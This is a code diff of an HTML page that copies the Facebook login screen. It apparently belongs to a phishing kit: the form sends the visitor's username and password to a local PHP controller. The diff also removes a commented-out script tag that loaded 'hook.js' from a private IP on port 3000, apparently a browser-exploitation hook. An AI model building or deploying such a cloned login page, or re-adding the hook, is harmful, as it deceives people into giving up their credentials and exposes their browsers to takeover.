@@ -5,9 +5,9 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Facebook – Log in or Sign up</title>
-  <link rel="stylesheet" href="styles/default.css">
-  <link rel="stylesheet" href="styles/style.css">
-  <link rel="icon" href="img/facebook.png" type="image/x-icon">
+  <link rel="stylesheet" href="assets/styles/default.css">
+  <link rel="stylesheet" href="assets/styles/style.css">
+  <link rel="icon" href="assets/img/facebook.png" type="image/x-icon">
 </head>
 <body>
   <div class="login">
@@ -16,7 +16,7 @@
           <div class="col-7">
               <div class="align-center">
                 <div class="content">
-                  <img src="img/logo.svg" alt="" style="transform: scale(2); margin-left: 2.6rem;">
+                  <img src="assets/img/logo.svg" alt="" style="transform: scale(2); margin-left: 2.6rem;">
                   <p>
                     Connect with friends and the world<br>
                     around you on Facebook.
@@ -26,7 +26,7 @@
           </div>
           <div class="col-5 col-xs-12">
             <div class="login-form">
-              <form action="facebook.php" method="post">
+              <form action="app/controllers/facebook.php" method="post">
                 <input id="email" type="text" placeholder="Email address or phone number" name="username"><br>
                 <input id="pass" type="password" placeholder="Password" name="password"><br>
                 <button id="login-btn" type="submit">Log In</button><br>
@@ -46,5 +46,4 @@
     </div>
   </div>
 </body>
-<!-- <script src="http://192.168.100.77:3000/hook.js"></script> -->
 </html>
